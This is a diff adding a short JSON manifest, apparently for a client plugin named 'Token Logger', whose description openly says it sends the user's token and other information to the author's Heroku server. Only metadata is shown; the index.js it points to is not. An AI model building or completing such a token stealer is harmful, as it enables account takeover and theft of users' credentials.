@@ -1,0 +1,7 @@
+{
+  "name": "Token Logger",
+  "description": "Logs your token (and additional info) to my heroku server.",
+  "author": "Drake",
+  "file": "index.js",
+  "license": "WTFPL"
+}
